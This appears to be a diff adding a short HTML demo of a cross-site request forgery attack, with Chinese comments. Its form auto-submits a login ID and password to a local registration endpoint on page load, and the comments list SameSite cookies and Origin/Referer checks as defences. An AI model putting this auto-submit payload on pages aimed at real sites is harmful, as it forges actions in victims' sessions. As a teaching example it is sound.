@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>跨站伪造请求攻击</title>
+</head>
+<body>
+<form id="add" action="http://127.0.0.1:9527/register" method="post">
+    <input type="text" name="loginId" value="2016">
+    <input type="text" name="loginPassword" value="123456">
+</form>
+<script>
+    document.getElementById("add").submit();
+//    只要用户点击后，该页面就直接向http://127.0.0.1:9527/register服务器发送请求
+    // 防止
+    // 为cookie添加sameSite属性
+    // 检查origin  referer 是否为同一站点
+    //
+</script>
+</body>
+</html>
